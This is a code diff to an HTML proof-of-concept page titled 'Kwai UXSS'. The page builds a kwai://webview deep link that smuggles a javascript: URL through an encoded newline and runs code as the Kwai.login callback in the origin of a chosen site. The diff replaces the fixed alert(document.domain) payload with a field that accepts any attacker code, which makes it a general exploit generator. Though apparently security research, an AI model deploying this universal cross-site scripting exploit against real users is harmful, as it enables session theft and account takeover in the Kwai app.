@@ -4,6 +4,7 @@
 <h1>Kwai UXSS</h1>
 Delay (ms) <input id="delay" value="800" type="number"/><br>
 Url for UXSS <input id="url" value="http://kwai.com" /><br>
+Code for UXSS <input id="code" value="alert(document.domain)//" /><br>
 <button id="genlink">Generate link</button><br>
 <a id="link" href="">link will be here</a>
 <script>
@@ -11,10 +12,11 @@ var delayInput = document.getElementById('delay');
 var urlInput = document.getElementById('url');
 var genlinkButton = document.getElementById('genlink');
 var linkElement = document.getElementById('link');
+var codeElement = document.getElementById('code');
 
 genlinkButton.onclick = function() {
     var link = "kwai://webview?url=javascript://%250asetTimeout(function(){"
-    + "Kwai.login(\"{'callback':'(function(){alert(document.domain);})'}\")},"+delayInput.value+");"
+    + "Kwai.login(\"{'callback':'"+codeElement.value+"'}\")},"+delayInput.value+");"
     + "location='"+urlInput.value+"'";
     linkElement.href = link;
     linkElement.innerHTML = link;
